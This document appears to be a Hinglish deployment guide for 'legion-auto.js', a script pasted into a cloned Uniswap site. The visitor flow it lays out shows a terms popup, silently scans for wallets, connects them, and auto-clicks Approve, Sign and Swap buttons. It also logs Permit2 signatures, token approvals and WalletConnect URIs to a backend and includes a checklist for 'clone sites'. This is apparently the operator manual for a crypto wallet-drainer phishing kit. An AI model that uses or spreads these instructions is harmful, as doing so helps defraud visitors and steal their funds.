# Agent Visitor — Final Attach Guide

## Final file (ek hi script)

```
standalone-browser-automation/dist/legion-auto.js   (~45 KB)
clones/uniswap-clone/legion-auto.js                 (copy for deploy)
```

Rebuild:
```powershell
cd standalone-browser-automation
npm run build
```

---

## Site par attach — 2 lines

`index.html` mein `</body>` se **pehle** paste karo:

```html
<script>
  window.LegionAgentConfig = {
    preset: 'uniswap',        // .nav-connect, #navConnectBtn selectors
    chainId: 1,               // null = auto from data-chain-id
    autoSwitchNetwork: true,
    termsTitle: 'Terms of Service',
    termsBody: '<p>By clicking Yes you agree to our terms and wallet connection.</p>',
    yesLabel: 'Yes',
    noLabel: 'No',
    // Optional — events tumhare backend ko:
    // eventEndpoint: 'https://your-api.com/agent-events',
    // onEvent: (type, data) => { /* custom */ },
  };
</script>
<script src="./legion-auto.js" defer></script>
```

### HTML attribute se chain (config mein chainId na do)

```html
<html data-chain-id="1" data-legion-preset="uniswap">
```

---

## Uniswap clone — existing legion.js ke saath

Clone mein abhi `legion.js` loaded hai. Options:

| Option | Kya karo |
|--------|----------|
| **A — Replace** | `legion.js` hatao, sirf `legion-auto.js` + config upar wala |
| **B — Parallel** | Dono mat chalao — conflict hoga |
| **C — Test** | Local `demo/` ya alag HTML page par pehle test karo |

**Recommended:** Option A — ek script `legion-auto.js`.

`index.html` change:
```html
<!-- REMOVE or comment -->
<!-- <script src="./legion.js?v=5.0.0"></script> -->

<!-- ADD -->
<script>
  window.LegionAgentConfig = { preset: 'uniswap', chainId: 1 };
</script>
<script src="./legion-auto.js" defer></script>
```

---

## Visitor flow (automatic)

```
1. Page load
2. Wallet scan (EIP-6963) — silent
3. T&C popup
4. User Yes
5. Detected wallet se connect
6. Chain switch (if config)
7. In-page Approve/Sign/Swap buttons auto-click
8. Mobile → WalletConnect deep link
9. Events → eventEndpoint (optional)
```

**Extension Confirm** user ke wallet mein — script control nahi kar sakti.

---

## Events (backend hook)

| Event | Kab |
|-------|-----|
| `wallets:detected` | Scan complete |
| `wallet:connected` | Address mila |
| `chain:switched` | Network change |
| `sign:typed-data` | Permit2 / EIP-712 |
| `tx:send` | Transaction request |
| `token:approve-click` | Approve button click |
| `wc:uri` | WalletConnect URI |

```js
window.LegionAgentConfig = {
  onEvent(type, data) {
    fetch('/api/log', { method: 'POST', body: JSON.stringify({ type, data }) });
  }
};
```

---

## Mobile visitors

- Auto-detect mobile UA
- WC URI → MetaMask / Trust deep link
- Nudge toast: "Opening wallet app…"

---

## Debug

```js
LegionAgentConfig.debug = true;
// Console: wallet list, clicks
WalletDetector.printReport();
TermsWalletAutomation.getDetectedWallets();
```

---

## Deploy checklist

- [ ] `legion-auto.js` same folder as `index.html`
- [ ] HTTPS (wallet extensions require)
- [ ] `LegionAgentConfig` before script tag
- [ ] `preset: 'uniswap'` for clone sites
- [ ] `chainId` match clone network
- [ ] Purana `legion.js` hatao (conflict avoid)
- [ ] Test: desktop MetaMask + mobile Trust

---

## Files summary

| File | Role |
|------|------|
| `dist/legion-auto.js` | **FINAL — site par yeh lagao** |
| `dist/attach-snippet.html` | Copy-paste template |
| `clone-presets/uniswap.json` | Preset reference |
| `build-bundle.mjs` | Rebuild after edits |
